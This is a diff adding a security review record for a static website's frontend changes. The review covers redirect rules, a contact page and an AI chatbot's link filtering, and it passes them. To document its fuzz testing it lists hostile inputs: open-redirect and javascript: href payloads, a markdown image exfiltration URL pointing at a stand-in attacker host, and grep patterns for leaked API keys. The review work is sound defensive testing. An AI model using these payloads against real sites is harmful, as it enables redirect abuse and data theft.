@@ -1,0 +1,100 @@
+{
+  "schema": "vantry.review/1",
+  "kind": "security",
+  "verdict": "pass",
+  "reviewer": "security-engineer",
+  "at": "2026-11-24T20:13:18Z",
+  "head": "61bc09ea6e8af84888136d385ac386a98bfd9786",
+  "base": "cf26127c83d58ab99aeb50b96dcf0c4b68bf91df (integrate/s2). The earlier range 0ff06a825873ad1959b73421f0b4b3a98b97a26a..cf26127 was reviewed PASS in .vantry/reviews/integrate-s2.security.json, commit 1592f18c718de1cac7d10cadbf79722a4a155c3a.",
+  "scope": "Delta cf26127..61bc09e (29 files, +2203/-507). STS-044 contact page (src/pages/Contact.tsx). STS-032 five /services/* pages (ServicePage.tsx, content/services/*). The chatbot link-policy fix for the prior MEDIUM (src/components/chatbot/links.ts). The prior image LOW (MarkdownRenderer.tsx img override). STS-036 About page. STS-039 retirement of /solutions, /solutions/:id, /industries and /industry/:id: a new public/_redirects, the /services hub, header and footer nav, seo.ts entries, and smoke checks for redirects. The site is a static SPA on Cloudflare Pages. The backend is out of scope.",
+  "sensitive_paths_hit": ["public/_redirects", "src/pages/Contact.tsx"],
+  "precondition": "scripts/verify.sh --gate returned 0 in wt-fe-s2-int (clean tree, HEAD 61bc09e). verify.sh --status reported 'receipt: pass @ 2026-11-24T19:53:04Z' for branch slug integrate-s2. dist/ in the worktree is the verified build of this HEAD, and dist/_redirects is byte-identical to public/_redirects (cmp). All reviewer probes ran on an isolated scratch copy, made with git archive 61bc09e and node_modules junctioned. Nothing in the repo was edited.",
+  "threat_model": "none. docs/security/ still does not exist at 61bc09e. Carry-over INFO, see findings.",
+  "checklist": ["data-authz", "privileged-credential", "boundary-validation", "secrets-pii", "webhooks", "storage", "headers-csp", "ai-context", "owasp-top-10"],
+  "evidence": {
+    "data-authz": "N/A. The delta adds no database, table, policy or query. Routes are now /, /about, /contact, /realisation, /insights, /careers, /services and five /services/<slug> pages. /auth and /dashboard are still unrouted, and App.routes.test.tsx passes 3/3 (deny and allow).",
+    "privileged-credential": "No new env read: grep of src and tools shows only VITE_API_URL (contact-submit.ts:68, openai.service.ts:45) and VITE_SITE_URL (seo.ts:21). In the verified dist, grep for sk-, sk-proj-, AKIA, AIza, ghp_, whsec_, sk_live_, pk_live_, PEM, service_role, OPENAI_API and VITE_OPENAI found 0 files, and there are 0 source maps. The only VITE_ token in the bundle is VITE_SITE_URL, and its env object is emitted as the empty literal Uu={}. package.json and package-lock.json are unchanged in the delta, so the dependency risk is unchanged from 1592f18.",
+    "boundary-validation": "Contact.tsx: handleSubmit (line 80) still calls submitContact(formData) (line 88). src/lib/contact-submit.ts is unchanged in the delta and posts to ${VITE_API_URL}/api/contact. The dist bundle has exactly two API paths, /api/contact (index chunk) and /api/chat (chatbot chunk). The new optional `config` prop on Contact is test-only: routes.tsx renders <Contact /> with no props, so production always uses BUSINESS. Every fact slot (phone, email, address, hours, booking, map) is gated by a business.ts helper. Booking links have target=_blank and rel=noopener noreferrer. Contact.test.tsx passes 21/21.",
+    "secrets-pii": "None of the unverified facts appears in any prerendered HTML: dist grep for 783-0443, 2765, Hamilton, info@, contact@, calendly, '24 hours', '24-48', 'John Doe' and john@company found 0 files. The 24-48h promise and the placeholder PII-shaped examples were removed. Calendly appears only (a) as the inert config string calendly.com/saraya-info in the index chunk, booking.verified=false, already an accepted risk, and (b) as a keyword weight in the chatbot intent table. Service-page outbound links come from build-time data: inspectionfast.com, mimapeds.com and asta-edu.com, all https, each target=_blank with rel=noopener noreferrer (ServicePage.tsx:79-81). The delta adds no console logging of form or chat content.",
+    "webhooks": "N/A. A static SPA has no webhook receiver.",
+    "storage": "N/A. There is no upload or storage access.",
+    "headers-csp": "public/_headers, index.html and vite.config.ts are unchanged in the delta. Prerendered /contact, /about and /services each carry exactly one <script> tag, the external module. tests/headers.test.mjs passes 5/5. The CSP is still Report-Only (accepted risk carried over).",
+    "ai-context": "Prior MEDIUM closed: links.ts:54 rejects a normalised pathname that starts with two slashes or backslashes. links.ts:58-65 re-parses the emitted href and requires the same origin and the same pathname, or returns text. Executed in a reviewer vitest fuzz of 483 hrefs, made of 87 hand-picked payloads plus a generated 9x11x4 grid. Grid prefixes: /, /./, /../, /a/../, /%2e/, /%2E%2E/, /.%2e/, /a/%2e%2e/, /./../. Grid middles: /, backslash, %2f, %5c, %2F, %5C, TAB+/, LF+/, /%2f, backslash+/, /+backslash. Grid hosts: evil.example, @evil.example, evil.example:443, evil.example/x?y#z. The hand-picked set adds backslash forms, %2f%2f, %5c%5c, TAB/LF/CR/NUL/space, NBSP, U+2028, BOM, fullwidth solidus, U+2215, U+2044, dot segments in plain and encoded forms, ';' segments, double-encoded %252e, query/hash '//', userinfo, javascript: in mixed case, with leading space, TAB/LF inside, &colon;, %3a, entity-encoded and with a leading control char, data:, DATA:, vbscript:, blob:, file:, ftp:, mailto:, https:host, https:/host, https:\\\\host, userinfo confusion, a backslash-@ trick, and http:///host. Result: internal 172, external 30, text 281, 0 unsafe. Every internal href resolves to the site origin, starts with a single '/' and contains no raw backslash or control char. Every external href is http(s) with a host, and the protocol-relative and backslash forms normalise to https://evil.example/ with a new tab. The specific payloads /.//, /..//, /a/..//, /%2e//, /%2e%2e//, /./\\evil, /\\t/ and /\\n/ all return 'text'. Encoded slashes such as /%2f%2fevil.example stay internal, and a left click in BrowserRouter lands on http://localhost:3000/%2f%2fevil.example: same origin, no decode into //, no SecurityError. The same holds for 13 other payloads. A DOM test rendered all 483 as markdown links plus image, reference, autolink and raw-HTML payloads: 280 anchors, 254 same-origin, 26 cross-origin and all 26 target=_blank with rel=noopener. Prior image LOW closed: MarkdownRenderer.tsx:81 maps img to alt text. ![x](https://evil.example/p.png?d=secret), reference-style images, a linked image and raw <img src=...> produced 0 <img>/<script>/<iframe>/<object>/<embed> elements. No evil .png URL appears in the DOM, and raw HTML is escaped text.",
+    "owasp-top-10": "Open redirect (_redirects): the reviewer parser (scratchpad redir-check2.mjs) checked dist/_redirects. It has 12 rules, every one a 301, and every target is a fixed same-origin path (/services or /services/<slug>) with no :placeholder, no splat substitution, no encoded slash or backslash, and no scheme or host. Sources sit only under /solutions, /solutions/*, /industries, /industries/ and /industry/*. 21 protected paths were checked and none is shadowed: /, /_headers, /_redirects, /assets/*.js, /assets/*.woff2, /images/*, /api/chat, /api/contact, /services, /services/, /services/website-design, /contact, /about, /robots.txt, /sitemap.xml, /favicon.ico, /404.html, /logo.png, /realisation, /insights, /careers. No target is itself a source, so there are no loops. Hostile inputs /solutions/https://evil.example, /solutions//evil.example, /industry/%2f%2fevil.example and /solutions/x?next=//evil.example all map to the constant /services. The repo's tests/redirects.test.mjs passes 10/10, and smoke.test.mjs passes 18/18. XSS sinks: the only dangerouslySetInnerHTML in src is still src/components/ui/chart.tsx:70 (unused, unchanged), and the delta adds no innerHTML, document.write, eval or new Function. getSeo now does a plain STATIC_SEO[path] lookup (hasOwnProperty removed). This is safe because normalizePath always prefixes '/': a reviewer test of __proto__, /__proto__, constructor, /constructor, toString, /hasOwnProperty and others shows all of them return the noindex 404 data. CtaLink treats any href starting with '/' as an internal Link, but its inputs are build-time constants only (bookingHref() / '/contact'), never untrusted input. The repo suites relevant to the delta (22 files, 340 tests including reviewer probes) all pass."
+  },
+  "prior_findings_status": [
+    {"id": "1592f18 MEDIUM links.ts:47 dot-segment //host bypass", "status": "closed", "proof": "links.ts:54 plus the re-parse check at links.ts:58-65. 483-payload fuzz with 0 unsafe results, and the DOM and click tests above. links.test.ts now has 45 cases (was 30)."},
+    {"id": "1592f18 LOW MarkdownRenderer.tsx:37 markdown image exfiltration", "status": "closed", "proof": "The img override at MarkdownRenderer.tsx:81 renders alt text only. 0 <img> for inline, reference, linked and raw-HTML images. MarkdownRenderer.test.tsx now has 10 tests (was 8)."},
+    {"id": "1592f18 LOW seo.ts:24 import.meta.env?.", "status": "open", "proof": "Still present, now at src/seo/seo.ts:21. Re-listed below."},
+    {"id": "1592f18 INFO vite.config.ts:15 preview existsSync oracle", "status": "open", "proof": "vite.config.ts is unchanged in the delta. Re-listed below."},
+    {"id": "1592f18 INFO openai.service.ts:54 backend obligations for /api/chat", "status": "open", "proof": "Backend repo, out of scope. Re-listed below."},
+    {"id": "1592f18 INFO tools/require-api-url.ts:8 localhost accepted in production build", "status": "open", "proof": "Unchanged in the delta. Re-listed below."},
+    {"id": "1592f18 INFO no threat model", "status": "open", "proof": "docs/security/ is absent at 61bc09e. Re-listed below."}
+  ],
+  "findings": [
+    {
+      "severity": "low",
+      "file": "src/seo/seo.ts",
+      "line": 21,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over from 1592f18 (was line 24), still open. `import.meta.env?.VITE_SITE_URL` stops Vite from replacing only that one key. The bundle emits an env object, today the empty literal `Uu={}`, and stays leak-free only because the optimiser drops the unused keys. This matters while a VITE_OPENAI_API_KEY may still be set in the Cloudflare Pages build environment. Verified dist has 0 secret patterns, so nothing leaks today.",
+      "fix": "Change to `import.meta.env.VITE_SITE_URL as string | undefined` (the static form, as at openai.service.ts:45). Ops: delete VITE_OPENAI_API_KEY from the Cloudflare Pages environment (owner action carried from the develop review).",
+      "recommendation": "Small chore, before the develop -> main release."
+    },
+    {
+      "severity": "info",
+      "file": "vite.config.ts",
+      "line": 15,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over from 1592f18, unchanged. The preview middleware calls existsSync on an un-normalised req.url, which tells a caller whether a directory exists outside dist. It serves no file content, it only runs in the local preview, and preview binds to localhost.",
+      "fix": "Resolve the path against distDir and require target.startsWith(distDir + path.sep) before calling existsSync.",
+      "recommendation": "Optional hardening."
+    },
+    {
+      "severity": "info",
+      "file": "src/services/openai.service.ts",
+      "line": 54,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over from 1592f18. With /api/chat live, the backend must treat client `history` as untrusted, rate-limit and token-cap the endpoint, and remove the retired unverified facts from the system prompt and knowledge base. The frontend side is unchanged in this delta.",
+      "fix": "Backend review of /api/chat covering Zod validation, the role allowlist, caps, the rate limit and a prompt/KB grep for 2765, 783-0443, calendly and info@.",
+      "recommendation": "Track in the backend repo before enabling chat in production."
+    },
+    {
+      "severity": "info",
+      "file": "tools/require-api-url.ts",
+      "line": 8,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over from 1592f18. A production build accepts http://localhost as VITE_API_URL, and build:verify injects http://localhost:3001. If the Cloudflare build command were ever build:verify, the live site would POST contact and chat data to the visitor's own localhost.",
+      "fix": "Keep the Cloudflare build command as `npm run build`. Optionally reject localhost when CF_PAGES === '1'.",
+      "recommendation": "Note in the deploy runbook."
+    },
+    {
+      "severity": "info",
+      "file": "docs/security/threat-models",
+      "line": 0,
+      "introduced_by_this_diff": false,
+      "summary": "Carried over. No threat model exists, and docs/security/ is absent at 61bc09e, while the contact and AI chat boundaries are live.",
+      "fix": "Run /threat-model for the contact + chat boundary.",
+      "recommendation": "Before the backend chat goes live."
+    }
+  ],
+  "accepted_risks": [
+    "All accepted risks from develop.security.json and 1592f18 carry over unchanged. They include the unrotated, previously exposed OpenAI key and the owner action to remove VITE_OPENAI_API_KEY from the Cloudflare Pages environment (human action, still open). They also include the dev/test-only dependency advisories, the react-router moderate advisories (the open-redirect class is mitigated by classifyHref, now without the dot-segment gap), the CSP in Report-Only mode, and the dead Auth, Dashboard and chart files.",
+    "The unverified Calendly URL is an inert config string (booking.verified=false), never rendered or linked.",
+    "External https links in bot replies still open in a new tab to any host, by design.",
+    "The 1592f18 condition 'fix the medium dot-segment finding before develop -> main' is now satisfied."
+  ],
+  "tests_executed_by_reviewer": {
+    "commands": [
+      "git -C wt-fe-s2-int status / rev-parse / log cf26127..61bc09e / diff --stat",
+      "scripts/verify.sh --gate (exit 0); scripts/verify.sh --status",
+      "git archive 61bc09e | tar -x into scratchpad/head; node_modules junction to wt-fe-s2-int/node_modules",
+      "npx vitest run (in scratchpad/head) on src/__review__ src/components/chatbot src/pages/Contact.test.tsx src/pages/services src/pages/About.test.tsx src/linkCrawl.test.tsx src/seo src/config src/services tests/redirects.test.mjs tests/headers.test.mjs tests/smoke/smoke.test.mjs src/components/Header.test.tsx src/entry-server.test.tsx src/App.routes.test.tsx => 22 files, 340/340 pass",
+      "node scratchpad/redir-check2.mjs wt-fe-s2-int/dist/_redirects => 12 rules, problems []",
+      "cmp public/_redirects dist/_redirects => identical",
+      "grep over dist for secrets, env names, API paths, unverified facts, source maps, script tags, outbound hrefs on service pages"
+    ],
+    "reviewer_probes": "scratchpad/head/src/__review__/links.fuzz.test.tsx: classifyHref over 483 hostile hrefs, specific expectations, and a MarkdownRenderer DOM sweep with image payloads. scratchpad/head/src/__review__/click.fuzz.test.tsx: BrowserRouter left-click navigation for 14 payloads, all staying on the same origin. scratchpad/head/src/__review__/seo.fuzz.test.ts: getSeo on prototype-key and retired paths (13 tests). All passed. Backslash payloads were built from String.fromCharCode(92) so that no shell escaping could distort them."
+  },
+  "verdict_rationale": "This delta introduces no critical, high or medium finding. The prior MEDIUM (links.ts dot-segment //host bypass) is closed: 483 hostile hrefs, a full DOM render and live left-click navigation never produced an off-origin internal link or a non-http(s) link. The prior image LOW is closed: no <img> is rendered from a bot reply. public/_redirects is a fixed table of 301s to same-origin paths, with no placeholder or splat in any target and no shadowing of assets, headers or API paths, so it is not an open redirect. The contact page still posts only to ${VITE_API_URL}/api/contact through the unchanged submitter, and it renders no unverified fact or secret. The delta adds no new secret and no new HTML sink. One prior LOW (seo.ts:21) and four INFO items remain open and are carried forward, together with the owner action on VITE_OPENAI_API_KEY."
+}
